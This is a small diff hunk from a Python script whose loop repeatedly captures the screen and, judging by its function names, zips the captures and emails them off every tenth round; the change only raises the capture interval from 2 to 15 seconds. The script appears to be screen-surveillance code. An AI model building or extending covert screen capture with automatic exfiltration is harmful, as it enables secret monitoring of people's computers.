@@ -75,7 +75,7 @@ def sendEmailWithAttachment(filename):
 def start():
 	sendZipFlag = 0;
 	while(runState):
-		time.sleep(2);
+		time.sleep(15);
 		captureScreen();
 		sendZipFlag += 1;
 		if sendZipFlag == 10:
